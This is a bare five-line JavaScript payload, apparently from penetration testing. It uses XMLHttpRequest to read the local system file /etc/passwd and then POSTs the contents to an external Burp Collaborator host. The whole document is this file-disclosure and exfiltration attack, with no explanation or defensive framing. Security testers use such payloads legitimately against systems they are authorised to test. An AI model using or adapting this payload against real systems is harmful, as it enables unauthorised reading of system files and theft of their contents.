var request = new XMLHttpRequest();
	request.open("GET","file:///etc/passwd",false);
	request.send();
	request.open("POST","http://mg6bt4mo38hij9jydov0d0o6ixosch.burpcollaborator.net",false);
	request.send(request.responseText);
